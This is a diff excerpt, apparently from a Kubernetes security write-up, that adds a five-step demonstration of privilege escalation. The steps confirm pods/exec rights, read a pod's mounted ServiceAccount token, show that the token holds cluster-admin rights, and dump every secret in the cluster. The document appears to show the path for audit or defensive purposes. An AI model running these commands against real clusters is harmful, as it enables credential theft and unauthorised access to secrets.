@@ -198,3 +198,21 @@ kubectl get pods -A -o json | jq -r '
    | [.metadata.namespace, .metadata.name, (.spec.serviceAccountName // "default")]
   ) | @tsv' | column -t
 ```
+```
+# 1. Confirm the granted permission
+kubectl auth can-i create pods/exec -n <namespace>          # yes
+
+# 2. Identify a target pod and its ServiceAccount
+kubectl get pods -n <namespace> \
+  -o custom-columns=POD:.metadata.name,SA:.spec.serviceAccountName
+
+# 3. Read the automounted token from inside the pod
+TOKEN=$(kubectl exec <pod-name> -n <namespace> -- \
+  cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+
+# 4. Confirm the ServiceAccount's effective rights with the stolen token
+kubectl --token="$TOKEN" auth can-i --list                  # *.* on * (cluster-admin)
+
+# 5. Demonstrate cluster-wide access
+kubectl --token="$TOKEN" get secrets -A
+```
